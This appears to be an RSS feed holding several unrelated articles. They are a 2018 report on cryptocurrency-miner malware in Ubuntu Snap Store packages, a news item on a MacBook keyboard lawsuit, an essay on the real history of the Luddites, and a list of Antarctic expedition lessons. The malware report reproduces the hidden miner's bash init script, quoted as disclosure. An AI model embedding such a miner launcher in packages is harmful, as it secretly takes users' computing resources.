<title>Malware Found in the Ubuntu Snap Store</title>
<link>https://www.linuxuprising.com/2018/05/malware-found-in-ubuntu-snap-store.html</link>
<guid isPermaLink="true" >https://www.linuxuprising.com/2018/05/malware-found-in-ubuntu-snap-store.html</guid>
<description>&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://2.bp.blogspot.com/-SQduQ-MZQJg/WvcucoWbrYI/AAAAAAAAAfA/Cm80FBQW8_4rlwyVnhFWU_VsOjrBeMCtwCLcBGAs/s1600/ubuntu-software-store-screenshot.png&quot; imageanchor=&quot;1&quot;&gt;&lt;img alt=&quot;Ubuntu Software Store&quot; border=&quot;0&quot; data-original-height=&quot;935&quot; data-original-width=&quot;1305&quot; height=&quot;458&quot; src=&quot;https://2.bp.blogspot.com/-SQduQ-MZQJg/WvcucoWbrYI/AAAAAAAAAfA/Cm80FBQW8_4rlwyVnhFWU_VsOjrBeMCtwCLcBGAs/s640/ubuntu-software-store-screenshot.png&quot; title=&quot;Ubuntu Software Store&quot; width=&quot;640&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;br/&gt;Oh, snap! Just because some packages are available to install directly from the Ubuntu Software Center doesn't make them safe. This is proved by a recent discovery of malware in some snap packages from the Ubuntu Snaps Store.&lt;p&gt;&lt;strong&gt;At least two of the snap packages, 2048buntu and Hextris, uploaded to the Ubuntu Snaps Store by user Nicolas Tomb, contained malware. All packages by Nicolas have since been &lt;a href=&quot;https://uappexplorer.com/snaps?q=author%3ANicolas+Tomb&amp;amp;sort=-points&quot; target=&quot;_blank&quot;&gt;removed&lt;/a&gt; from the Ubuntu Snaps Store, &quot;&lt;a href=&quot;https://github.com/canonical-websites/snapcraft.io/issues/651#issuecomment-388546799&quot; target=&quot;_blank&quot;&gt;pending further investigations&lt;/a&gt;&quot;.&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;The report comes from a &lt;a href=&quot;https://github.com/canonical-websites/snapcraft.io/issues/651&quot; target=&quot;_blank&quot;&gt;bug&lt;/a&gt; which mentions that the 2048buntu snap package (and other packages by Nicolas Tomb) contains a hidden cryptocurrency miner inside. You can see the init script below:&lt;/p&gt;&lt;pre class=&quot;cssterm&quot;&gt;
&lt;code&gt;#!/bin/bash

currency=bcn
name=2048buntu


{ # try
/snap/$name/current/systemd -u myfirstferrari@protonmail.com --$currency 1 -g
} || { # catch
cores=($(grep -c ^processor /proc/cpuinfo))

if (( $cores &amp;amp;lt; 4 )); then
    /snap/$name/current/systemd -u myfirstferrari@protonmail.com --$currency 1
else
    /snap/$name/current/systemd -u myfirstferrari@protonmail.com --$currency 2
fi
}&lt;/code&gt;
&lt;/pre&gt;
&lt;br/&gt;Yes, &lt;em&gt;myfirstferrari@protonmail.com&lt;/em&gt; was used in the miner script. I guess that's one way of getting a Ferrari... 🙂.&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-yrHrAqyxdKk/WvcuyGVYKAI/AAAAAAAAAfI/rTzS5qF1LeEs8vI92auKH0uhVYWgQvU-QCLcBGAs/s1600/2048buntu-game-ubuntu-snap-store.png&quot; imageanchor=&quot;1&quot;&gt;&lt;img alt=&quot;2048buntu ubuntu snap store&quot; border=&quot;0&quot; data-original-height=&quot;798&quot; data-original-width=&quot;1011&quot; height=&quot;504&quot; src=&quot;https://1.bp.blogspot.com/-yrHrAqyxdKk/WvcuyGVYKAI/AAAAAAAAAfI/rTzS5qF1LeEs8vI92auKH0uhVYWgQvU-QCLcBGAs/s640/2048buntu-game-ubuntu-snap-store.png&quot; title=&quot;2048buntu ubuntu snap store&quot; width=&quot;640&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;br/&gt;An interesting aspect is that Nicolas Tomb used a proprietary license for at least some of his snaps. For example, the 2048buntu snap was submitted as proprietary (the game itself was not developed by Nicolas). The game in question, &lt;a href=&quot;https://github.com/gabrielecirulli/2048&quot; target=&quot;_blank&quot;&gt;2048&lt;/a&gt;, uses a MIT license which permits distributing it as proprietary, without making the source code available, as long as the copyright notices are retained.&lt;p&gt;Side note: 2048buntu was removed from the Ubuntu Snap store but you can check out its page via &lt;a href=&quot;https://webcache.googleusercontent.com/search?source=hp&amp;amp;ei=BDT3WvTIKaGr6AT295HIDw&amp;amp;q=cache%3Ahttps%3A%2F%2Fsnapcraft.io%2F2048buntu&amp;amp;oq=cache%3Ahttps%3A%2F%2Fsnapcraft.io%2F2048buntu&amp;amp;gs_l=psy-ab.3...5653.7198.0.7376.7.7.0.0.0.0.125.686.4j3.7.0....0...1c.1.64.psy-ab..0.6.614...0j46j0i46k1.0.OioghBze15M&quot; target=&quot;_blank&quot;&gt;Google Cache&lt;/a&gt;. But we can't see the package contents any more (unless it's on GitHub somewhere but I couldn't find it).&lt;/p&gt;&lt;p&gt;&lt;em&gt;How was this possible?&lt;/em&gt; Well, the Ubuntu Snap Store allows anyone to upload snap packages, as opposed to packages (deb) available in the official Ubuntu repositories. The reason for this is to provide more easily installable packages to its users.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;What's your opinion regarding this? Do you think more and more malware will be getting through to users by allowing anyone to upload packages to the Ubuntu Store, or was this an isolated incident?&lt;/strong&gt;&lt;/p&gt;

<title>Apple faces class action lawsuit over failing MacBook butterfly keyboards</title>
<link>https://9to5mac.com/2018/05/12/apple-keyboard-lawsuit/</link>

<description>&lt;p&gt;Apple’s &lt;a href=&quot;https://9to5mac.com/2017/02/22/apple-butterfly-keyboard-poll/&quot;&gt;polarizing butterfly keyboard design&lt;/a&gt; is now causing the company some legal issues. A new class action lawsuit has been filed against Apple, alleging that the company knew about the reliability issues of the design before launch, yet released it anyway…&lt;/p&gt;

&lt;/div&gt;
&lt;p&gt;As outlined by &lt;em&gt;&lt;a href=&quot;https://appleinsider.com/articles/18/05/11/apple-hit-with-action-suit-over-macbook-macbook-pro-butterfly-keyboard-failures&quot;&gt;AppleInsider&lt;/a&gt;&lt;/em&gt;, the lawsuit was filed in the Northern District Court of California and includes both the 12-inch MacBook and the MacBook Pro.&lt;/p&gt;
&lt;p&gt;The lawsuit alleges that “thousands” of users have suffered from problems with the butterfly keyboard device that render it ultimately useless. The lawsuit says that even “minimal amounts of dust or debris” causes the keyboard to fail, thus rendering one of the “core functions” of the MacBook broken. This makes the device “inoperable and unsuitable for its ordinary and intended use.”&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Apple’s butterfly keyboard and MacBook are produced and assembled in such a way that when minimal amounts of dust or debris accumulate under or around a key, keystrokes fail to register. The keyboard defect compromises the MacBook’s core functionality.&lt;/p&gt;
&lt;p&gt;As a result of the defect, consumers who purchased a MacBook face a constant threat of non-responsive keys and accompanying keyboard failure. When one or more of the keys on the keyboard fail, the MacBook can no longer serve its core function: typing. Thus, when this defect manifests in the MacBook, the computer becomes inoperable and unsuitable for its ordinary and intended use.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The lawsuit goes on to allege Apple “knew that the MacBook is defective at or before” the release. Furthermore, it knew of the issues uses of the 12-inch MacBook were having, yet still brought the butterfly keyboard to the MacBook Pro and sold it at “premium prices.”&lt;/p&gt;
&lt;p&gt;Additionally, the suit takes issues with Apple’s marketing – which touts that the butterfly keyboard offers “four times more key stability than a traditional scissor mechanism.”&lt;/p&gt;
&lt;p&gt;The 1-year warranty Apple offers to users is acknowledged in the lawsuit, but it argues that “Apple routinely refuses to honor its warranty obligations,” instead instructing MacBook users to “try self-help remedies that it knows will not result in permanent repair.&lt;/p&gt;
&lt;p&gt;Ultimately, the lawsuit seeks damages, legal fees, and alls for Apple to disclose the keyboard flaws and replace defective units, including reimbursement for the initial laptop purchase.&lt;/p&gt;
&lt;p&gt;This certainly isn’t the first time Apple has come under fire for its butterfly keyboard mechanism. Earlier this month, a petition called for Apple to recall and replace defective MacBook keyboards – that petition has since &lt;a href=&quot;https://9to5mac.com/2018/05/03/macbook-pro-keyboard-petition/&quot;&gt;accumulated over 17,000 signatures&lt;/a&gt;.&lt;/p&gt;

<title>Why the Luddites Matter</title>
<link>https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/</link>
<guid isPermaLink="true" >https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/</guid>
<description>&lt;blockquote readability=&quot;14.766839378238&quot;&gt;
&lt;p&gt;Chant no more your old rhymes about bold Robin Hood,&lt;/p&gt;
&lt;p&gt;His feats I but little admire&lt;/p&gt;
&lt;p&gt;I will sing the achievements of General Ludd&lt;/p&gt;
&lt;p&gt;Now the Hero of Nottinghamshire&lt;/p&gt;
&lt;p&gt;&lt;em&gt;– General Ludd’s Triumph,&lt;/em&gt; &lt;a href=&quot;https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/#_edn1&quot; name=&quot;_ednref1&quot;&gt;[1]&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Colloquialisms have a remarkable way of convincing their users that they have done their homework. All that is needed is a spoonful of vaguely historically adjacent meaning to be stirred in with the waters of repeat usage, and suddenly a speaker feels confident that they understand the capital “t” truth behind a term or idea. After all, the thinking goes, if this usage of this term isn’t historically accurate, then why has this term become used in this way? Why indeed. But if you are going to use a term because of the evocative historic meaning you think is bound up in it, you probably want to make sure that you’re getting your history right.&lt;/p&gt;
&lt;p&gt;Which brings us to the Luddites.&lt;/p&gt;
&lt;p&gt;It is undeniable that the term Luddite has become fairly common shorthand in much of the English speaking world. As it is commonly deployed in regular discourse the term has come to be an easy descriptor for someone who “hates technology,” someone who is “afraid of technology,” or someone who is simply “bad with technology.” Depending on its specific usage, Luddite is can either be used as an expression of comical self-deprecation, or it is thrown about as an insult. Lurking somewhere in the background of most people’s usage of the term is just enough historical knowledge to get partial credit on a history test: the Luddites were some people long ago in England who smashed some machines. Onto this basic foundation, other things wind up getting thrown in as well: the Luddites hated technology, the Luddites hated progress, if the Luddites won we’d be living in caves, the Luddites were illiterate idiots, and so forth. As the historian E.P. Thompson aptly observed before laying waste to the historical basis of this belief, “Luddism lingers in the popular mind as an uncouth, spontaneous affair of illiterate handworkers, blindly resisting machinery.”&lt;a href=&quot;https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/#_edn2&quot; name=&quot;_ednref2&quot;&gt;[2]&lt;/a&gt; For a society awash in smartphones, in love with the Internet, and with its hopes for a better future pinned on Silicon Valley – the Luddites appear as the perfect bogeymen. The specter of the Luddites makes it easy to disparage anyone who dares speak out against anything technological by painting them as fools pining for the past who really just want everyone to go live in caves in the woods.&lt;/p&gt;
&lt;p&gt;Of course, much of this popular imaginary of the historic Luddites is dead wrong. When the term Luddite is swung about carelessly it smashes any sense of historical nuance, and supplants contemporary values and ideologies for those actually held by the Luddites. Used as a colloquial epithet, Luddite is a powerful method for cutting off critical thinking.&lt;/p&gt;
&lt;p&gt;Yet, to put it directly, why does it matter how we talk about the Luddites?&lt;/p&gt;
&lt;p&gt;Because when we talk about the Luddites, we aren’t talking about the real Luddites, we’re talking about ourselves. And so we should be very careful about the values that are being snuck into the way we talk.&lt;/p&gt;
&lt;p&gt;So, who were the real Luddites?&lt;/p&gt;
&lt;p&gt;The historic Luddites were skilled craft workers laboring in England in the early 19th century, and they were amongst the first groups to see their jobs and lifestyles fall victim to mechanization; their opposition to “obnoxious” machinery was in keeping with their view that the imposition of these machines would bring “a sad end to an honourable craft.”&lt;a href=&quot;https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/#_edn3&quot; name=&quot;_ednref3&quot;&gt;[3]&lt;/a&gt; The turn to machine-breaking, the tactic for which they are remembered, was not a “spontaneous affair” but came only after the workers appeals to parliament to protect their “honourable craft” were ignored.&lt;a href=&quot;https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/#_edn4&quot; name=&quot;_ednref4&quot;&gt;[4]&lt;/a&gt; The Luddites took up arms but they did so with support of their communities,&lt;a href=&quot;https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/#_edn5&quot; name=&quot;_ednref5&quot;&gt;[5]&lt;/a&gt; and they rose up out of a sense that they were protecting rights that had been established by “Custom and Law.”&lt;a href=&quot;https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/#_edn6&quot; name=&quot;_ednref6&quot;&gt;[6]&lt;/a&gt; The actions of the Luddites took on a variety of forms, not solely limited to machine-breaking, that are best captured by Eric Hobsbawm’s description of them as: “collective bargaining by riot.”&lt;a href=&quot;https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/#_edn7&quot; name=&quot;_ednref7&quot;&gt;[7]&lt;/a&gt; The assaults on machines were not simply about “blindly resisting machinery,” rather the Luddites chose the sites of their ire based on how the new machines were being set to action in those particular factories. The Luddites picked their targets carefully as they waged their campaign, the frames they targeted for breaking were those that belonged to employers who had used these new machines as an excuse to lower worker’s wages,&lt;a href=&quot;https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/#_edn8&quot; name=&quot;_ednref8&quot;&gt;[8]&lt;/a&gt; and this was a trend seen across the areas where the Luddites rose .&lt;a href=&quot;https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/#_edn9&quot; name=&quot;_ednref9&quot;&gt;[9]&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Eventually the Luddites were suppressed, violently at that. Soldiers were deployed to quell the unrest, and parliament made machine breaking punishable by death. Yet, it would be unwise to suggest that the Luddites actions met with no success. By the time that Luddism died down the actions of this “army of redressers” had succeeded in convincing many of the factory owners to pay better wages; and the end of Luddism was not the result of the rising’s failure but due to the number of soldiers that had been mobilized to quash it and by the threat of the new legislation.&lt;a href=&quot;https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/#_edn10&quot; name=&quot;_ednref10&quot;&gt;[10]&lt;/a&gt; Importantly, this did not mark the end of machine breaking as a tactic, far from it. &lt;a href=&quot;https://librarianshipwreck.wordpress.com/2014/08/28/who-was-captain-swing/&quot;&gt;From the latter part of 1830 into 1831, England was once more convulsed by machine-breaking in the form of The Swing Riots.&lt;/a&gt;&lt;a href=&quot;https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/#_edn11&quot; name=&quot;_ednref11&quot;&gt;[11]&lt;/a&gt; In the course of which, displaced workers attacked threshing machines, in what Eric Hobsbawm and George Rudé called the “Luddism of the poor.”&lt;a href=&quot;https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/#_edn12&quot; name=&quot;_ednref12&quot;&gt;[12]&lt;/a&gt; And though this movement was eventually repressed as well, it was both more destructive of machinery and more successful for those who participated, which prompted Hobsbawm and Rudé to observe that “the real name of King Ludd was Swing.”&lt;a href=&quot;https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/#_edn13&quot; name=&quot;_ednref13&quot;&gt;[13]&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;One cannot fully encapsulate all of a complex history in two paragraphs – but what the above summary hopefully demonstrates is a few pertinent details regarding the Luddites that run counter to what most people think when they hear that term thrown around. First, the Luddites did not indiscriminately attack “all machines,” but directed their outrage at certain machines, in certain factories, being used in certain ways. Second, the Luddites were a popular movement in their time and their end came not due to “inevitable technological progress” but due to the deployment of soldiers and the introduction of harsh legislation. Third, the tactic of “machine breaking” though it is often associated with the Luddites is not exclusive to them: history is filled with examples of workers purposely breaking their machines as a way of resisting not against machinery (as such) but the broader economic system. Lastly, and perhaps most importantly is that which is bound up in Hobsbawm’s evocative phrase “collective bargaining by riot” a term that suggests that the best way to think of the Luddites is as forerunners of the labor movement; as workers they had no protections (a point confirmed for them when parliament refused to protect their craft) and so they quite literally took matters into their own hands.&lt;/p&gt;
&lt;p&gt;As for the question of what the Luddites wanted, or what the world would look like if the Luddites had been able to “have their way”? Frankly, the Luddites wanted to be able to feed their children, they didn’t want to be driven into poverty, and they thought those things were more important than the factory owners becoming wealthier and more powerful. There is nothing particularly radical or incomprehensible about such desires. You probably want to be able to feed your children (if you have any), you probably don’t want to be driven into poverty, and you probably feel that your economic security is at least as important as your boss’s ability to buy a new vacation home. Had the Luddites had “their way” they would have been given a voice in determining their labor conditions, and they would have been allowed to share in the benefits of the new machinery. It’s ridiculous to suggest they were opposed to “progress” because the ideologies hung on that term today were unknown in that time; but if we must keep with the language of “progress” it’s not that the Luddites opposed it, they just thought they should get to benefit as well. As the historian David Noble commented, “the Luddites were perhaps the last people in the West to perceive technology in the present tense and to act upon that perception.”&lt;a href=&quot;https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/#_edn14&quot; name=&quot;_ednref14&quot;&gt;[14]&lt;/a&gt; That which makes the Luddites so strange, so radical, and so dangerous is not that they wanted everyone to go back to living in caves (they didn’t want that), but that they thought that those who would be impacted by a new technology deserved a voice in how it was being deployed.&lt;/p&gt;
&lt;p&gt;Of course, we know that today the Luddites are not viewed particularly kindly. And the “why” of this brings us back to an earlier point: when we talk about the Luddites, we aren’t talking about the real Luddites, we’re talking about ourselves. Or, as Theodor Roszack once put it: “if the Luddites had never existed, their critics would have to invent them.”&lt;a href=&quot;https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/#_edn15&quot; name=&quot;_ednref15&quot;&gt;[15]&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The contemporary moment is one in which technological tales dominate many headlines: delivery drones, thinner smartphones, wearable gadgets, driverless cars, robots, big data, bitcoin, social media, nuclear weapons, hacking, virtual reality…and the list could go on. And behind those tales stand publicly praised tech moguls: Jeff Bezos, Bill Gates, Mark Zuckerberg, Elon Musk, Jeff Bezos…and the list goes on. Generally, these new technologies are framed as inevitable, these fortunes are framed as being linked to “geniuses,” furthermore the hoi polloi are told that “resistance is futile” and that all of these things represent “progress.” And you don’t want to resist progress, do you? You aren’t [gasp!] some kind of Luddite, are you?&lt;/p&gt;
&lt;p&gt;There is a widespread belief in contemporary computer dominated societies, that regular people are not allowed any say in the discussions around the types of technologies that radically reshape their lives. And the way that the term Luddite is commonly used functions to reify this belief by making people believe that they cannot push back against technology. Of course, as the above history demonstrated, the irony is that what the Luddites prove is that you actually can push back, you can build up a mass movement around it, and you can in fact be so successful that the government is forced to deploy soldiers and pass harsh legislation in order to squash you.&lt;/p&gt;
&lt;p&gt;Need a more recent example? &lt;a href=&quot;https://librarianshipwreck.wordpress.com/2015/01/21/on-broken-glass/&quot;&gt;How about Google Glass&lt;/a&gt;. When Google unveiled that wearable high-tech headset it was framed as “inevitable,” those who raised worries were dismissed as “Luddites,” and Google seemed hellbent on pushing forward regardless. Google Glass was going to be the next thing, not because regular people wanted it to be, but because Google insisted that it would be. But a funny thing happened: people said no, and Google’s “world changing” product was shelved. There’s certainly a difference between the public rejecting a piece of consumer technology and workers pushing back against mechanization – but the common thread that connects them is that you do not have to let a tech company screaming “technological progress” in your face turn you into a paragon of passivity. And what’s more you don’t have to accept a false dichotomy wherein saying no to one kind of technology means that you are rejecting all technology.&lt;/p&gt;
&lt;p&gt;What an honest consideration of the Luddites allows is for us to see ourselves as active forces within the technological world. We can choose what to use. We can choose what not to use. We can choose how we use things. We can unite with other people to push for certain things, to push against other things. We can reclaim our ability to recognize that technology is not a neutral force in our lives or in our society. In the midst of recent years that have shown the sorts of racist and misogynistic biases that are often endemic in the tech world, we would be well advised to accept some Luddite skepticism about the values embodied in new technologies. As the computer scientist and AI pioneer Joseph Weizenbaum wisely it: “the myth of technological and political and social inevitability is a powerful tranquilizer of the conscience. Its service is to remove responsibility from the shoulders of everyone who truly believes in it. But, in fact, there &lt;em&gt;are&lt;/em&gt; actors!”&lt;a href=&quot;https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/#_edn16&quot; name=&quot;_ednref16&quot;&gt;[16]&lt;/a&gt; The Luddites remind us that there &lt;em&gt;are&lt;/em&gt; people behind these technologies, those people have their own values, those values get built into the technological systems they’re building – and those values aren’t necessarily the same as our values. Moreover, the Luddites remind us that we too &lt;em&gt;are&lt;/em&gt; actors.&lt;/p&gt;
&lt;p&gt;Before closing it is essential to recognize a key bait and switch that is pulled when Luddite is used as an ahistorical insult: it serves to turn particular acts of resistance, against particular technologies, in particular contexts, into acts that are against all technology. It would be ridiculous to claim that a person who dislikes McDonald’s or critiques factory farming is “anti-food,” and it is just as ridiculous to claim that a person who dislikes Google or who critiques the labor practices behind high-tech gadgets is “anti-technology.” That a person opposes Google Glass doesn’t mean that they oppose eyeglasses, that a person is wary of facial recognition software doesn’t mean they oppose cameras. &lt;a href=&quot;https://librarianshipwreck.wordpress.com/2017/07/20/against-the-anti-technology-strawman/&quot;&gt;As it is commonly used “Luddite” is a strawman&lt;/a&gt;, it transmutes any criticism of a certain piece of technology or a certain use of a certain piece of technology into an attack on all technology. And though this is ridiculous, it works to advance a particular set of ideological and economic values wherein the only thing that matters is “technological progress.” And what often goes unseen and unsaid is that “technological progress” is not a game in which everyone wins, oftentimes such “progress” only serves to increase the power of those who are already powerful. As Langdon Winner observed: “Current developments in the information age suggest an increase in power by those who already had a great deal of power, an enhanced centralization of control by those already prepared for control, an augmentation of wealth by the already wealthy.”&lt;a href=&quot;https://librarianshipwreck.wordpress.com/2018/01/18/why-the-luddites-matter/#_edn17&quot; name=&quot;_ednref17&quot;&gt;[17]&lt;/a&gt; At risk of being crass, the more religiously someone sings the praises of “technological progress” the further they and their family live from an e-waste dump. And of course the supreme irony of the idea that had the Luddites won we’d be “living in caves” is that what is threatening to send us back to the stone age is nuclear war (decidedly high-tech), and technologically exacerbated climate change.&lt;/p&gt;
&lt;p&gt;Those who bristle at the suggestion that they stop using Luddite as an epithet often say that “meanings change over time.” This is clearly true, but it’s worth considering the value systems that are behind those changes. Furthermore, it also demonstrates a discomforting level of fecklessness meshed with a stunning disregard for history. One also frequently hears people defend the use of the term by claiming “we need this term,” but in all seriousness: what “we” is being used here? Certainly, massive tech companies and the tech press want a useful strawman/bogeyman in order to convince you that the best you can be in the contemporary world is a hapless consumer. But do you really need such a term? And do you really want to defend the position that the history bound up in a term doesn’t matter if lots of people use that term?&lt;/p&gt;
&lt;p&gt;Admittedly, I write this as a doctoral student whose research focuses on the history of technology, and the traditions of critiques of technology. And I must report that it seems quite obvious that terms like “anti-technology” and even “technophobia” are just signs of lazy thinking, they say far more about the person using those terms than the people being accused of being “anti-technology.” In the vast majority of cases when you actually consider what these so-called “anti-technology” folks believe you realize that they don’t oppose “all” technology but (brace yourself) particular technologies, being used in particular ways, in a particular context. This is not to pretend that genuinely “extreme” cases don’t exist, but to claim that someone who thinks Facebook has become too big wants us all to go back to living in the woods is patently absurd. Yet it is the type of absurdity that becomes common in a society that has lost the ability to think critically about technology. And having the right terminology, can be an important step in renewing critical thinking. Which is why many individuals have, with unfortunately limited success, tried to rehabilitate the term Luddite. Alas, many serious thinkers remain so terrified of being tarred as Luddites that they begin their books (or articles, or talks) by carefully intoning how much they love technology – but the result of all of this is that it cedes the terms of the argument to the companies that want you to buy a new phone, want you to keep hitting like, and want you to upload a selfie to their fun new app so that you can help hone their facial recognition algorithms.&lt;/p&gt;
&lt;p&gt;We are in the midst of a moment in time when many people are emphasizing how important it is for people to think seriously about history. So let us think about the history of technology. And let us think about the Luddites not as caricatures, but as real people.&lt;/p&gt;
&lt;p&gt;The Luddites were not “anti-technology.” They were skilled craft workers who believed that the new machinery being deployed by factory owners would impoverish, disempower, and immiserate them. They were right. They didn’t want “zero technology,” they wanted to feed their families. If they had their way we wouldn’t be living in a world with “no technology,” we’d be living in a world where communities have a say in the technological decisions that will impact them.&lt;/p&gt;
&lt;p&gt;It is truly a shame that in 2018 many people have a less nuanced understanding of technology and progress than the Luddites had in 1812.&lt;/p&gt;

<title>Things no one tells you before an Antarctic expedition (2015)</title>
<link>https://www.telegraph.co.uk/men/active/11315994/Ten-things-no-one-tells-you-before-an-Antarctic-expedition.html</link>
<guid isPermaLink="true" >https://www.telegraph.co.uk/men/active/11315994/Ten-things-no-one-tells-you-before-an-Antarctic-expedition.html</guid>
<description>&lt;div class=&quot;firstPar&quot;&gt;
&lt;p&gt;&lt;strong&gt;1. You're going to have to eat a lot of raw butter.&lt;/strong&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;secondPar&quot;&gt;
&lt;p&gt;When you are skiing across Antarctica and putting in 12-14 hour days of pulling a sled in minus 40C, you have to keep your calorie count up. A normal man burns about 2,500 calories in a day. We burn between 7,000 to 9,000. That means supplementing your dehydrated food with slabs of butter. In the first few days of the expedition, it tastes revolting, but then your body just craves the fat content and you eat the butter like blocks of cheese.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;thirdPar&quot;&gt;
&lt;p&gt;&lt;strong&gt;2. Washing is a painful experience.&lt;/strong&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;fourthPar&quot;&gt;
&lt;p&gt;We melt snow to make drinking water, but there is not enough fuel to have water for washing. Therefore, the only way to keep clean on an 80 day expedition is by running outside naked in minus 30 and rubbing yourself down with snow. It’s traumatic - and not just for you, as frequently you scare the hell out of your teammates by crashing into the tent beside them totally naked.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;fifthPar&quot;&gt;
&lt;p&gt;&lt;strong&gt;3. Take it one step at a time.&lt;/strong&gt;&lt;/p&gt;
&lt;/div&gt;

&lt;div class=&quot;body&quot;&gt;
&lt;p&gt;On the traverse of Antarctica we were trying to cover 1,850km. After the first week, we had only done a few miles total and then had to climb 3,000m onto the high polar plateau. The lack of progress and subsequent sense of utter despair can easily overwhelm you, so you have to break the journey down into small increments just to keep sane. It may seem stupid celebrating travelling 100km when you have 18 times that distance to go, but never underestimate the power of denial.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Choose your companions carefully. You may have to eat them.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;So goes the famous polar maxim. But choosing your teammates wisely is the difference between an enjoyable trip and one where you want to commit homicide on a daily basis. Tiny idiosyncrasies, such as snoring, chewing too loudly, or fidgeting in the tent, can be a source of incredible tension that builds up over the days of confinement.&lt;/p&gt;
&lt;p&gt;&lt;img version=&quot;c&quot; refid=&quot;3150022&quot; width=&quot;460&quot; height=&quot;287&quot; caption=&quot;&quot; declared-caption=&quot;&quot; src=&quot;https://secure.i.telegraph.co.uk/multimedia/archive/03150/Patrick-reflection_3150022c.jpg&quot; photographer=&quot;&quot; name=&quot;Patrick-reflection&quot;/&gt;&lt;sup&gt;Patrick Woodhead&lt;/sup&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. Going mental.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Middle aged people tend to make better polar explorers. Not so much because they are physically more capable, but more to do with their mental capacity. Out on the high polar plateau there is nothing but endless white stretching off in every direction. You ski for 12 hours a day and because of the wind and cold, it’s almost impossible to talk to your team mates. So, in effect, you are alone in your head for all that time. By being a bit older and having a bit more life experience, it helps fill the blank canvas that is Antarctica.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. The tent is a surprisingly nice place to be.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Due to 24 hours sunlight and the power of the solar radiation, the tent warms up considerably. It may be as low as minus 40C outside, but inside the tent it can reach +5C. This means the tent is a wonderful shelter from the elements. You can repair all your clothing, eat some food and generally relax even when you are hundreds of kilometers from the nearest other humans.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. Take a notebook and pencil.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Writing down your inner turmoil, thoughts, moments of brilliance, or moments of despair and frustration is one of the more valuable parts of an expedition. It also forms valuable research for my books because it enables me to capture my raw thoughts when in the moment.&lt;/p&gt;
&lt;p&gt;&lt;img version=&quot;c&quot; refid=&quot;3150025&quot; width=&quot;460&quot; height=&quot;287&quot; caption=&quot;&quot; declared-caption=&quot;&quot; src=&quot;https://secure.i.telegraph.co.uk/multimedia/archive/03150/two-people-on-mass_3150025c.jpg&quot; photographer=&quot;&quot; name=&quot;two-people-on-massive-white-landscape&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. Frostbite is about sweat, genetics and experience.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Getting frostbite is a very real part of a protracted polar expedition. It’s only too easy to work a bit harder than you should, work up a sweat and then the sweat ices up on the inside of your jacket or gloves. You have to operate just under the sweat level (which in minus 40C is quite high). Secondly, it’s about experience. You need to know how long you can freeze your hands for as you fix a broken ski binding, for example, before you have to stop what you are doing and devote some attention to warming up your hands. You can only know how far to push your body before doing damage to it if you have been in the field and have the experience. Lastly, it is genetics. Pure and simple. Some people are just better in the cold than others.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;9. Expect delays.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Planes rarely run on schedule due to changes in weather. Add a lot of spare time to the other sides of your expedition, as it is just not going to run according to the preconceived dates.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;10. Re-entry.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;There is often a huge sense of isolation and disconnect when you come back to everyday life. For so long, you have been out in the wilderness and singularly concerned with survival and mileage, so when you get back to the real world and people talk about their jobs, or what they did at the weekend, it all feels foreign. You must remember that people have their own lives and their own interests. Just because you like Antarctica and polar expeditions, it doesn't mean anyone else should give a damn about you or what you did.&lt;/p&gt;
&lt;p&gt;&lt;img version=&quot;f&quot; refid=&quot;3150029&quot; width=&quot;220&quot; height=&quot;333&quot; caption=&quot;&quot; declared-caption=&quot;&quot; src=&quot;https://secure.i.telegraph.co.uk/multimedia/archive/03150/patrick-woodhead-b_3150029f.jpg&quot; photographer=&quot;&quot; name=&quot;patrick-woodhead-book&quot;/&gt;&lt;/p&gt;

<title>Is K8s Too Complicated? ￼</title>
